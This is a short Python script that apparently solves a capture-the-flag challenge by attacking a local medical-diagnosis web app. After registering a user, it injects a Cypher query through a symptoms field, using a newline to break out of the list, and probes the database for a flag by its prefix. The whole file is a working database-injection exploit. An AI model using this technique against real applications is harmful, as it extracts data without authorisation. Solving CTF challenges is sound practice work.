import requests

url = "http://127.0.0.1:3000"

with requests.Session() as session:
    session.post(url + '/api/setUser', json={"ssn":"abc90","fullname":"abc90","dateOfBirth":"1/1/1999","weight":"100"}, verify=False)
    payload = "Fatigue']\u000aMATCH (f:Flag) WHERE f.flag STARTS WITH 'ctfzone{N0w'//"
    session.post(url + '/api/setSymptoms', json= {"ssn":"abc90","symptoms":[ "Anxiety","Obsessions","Difficulty concentrating","Compulsions", payload]}, verify=False)
    r = session.post(url + '/api/getDiagnosis', json= {"ssn":"abc90"}, verify=False)
    print(r.text)
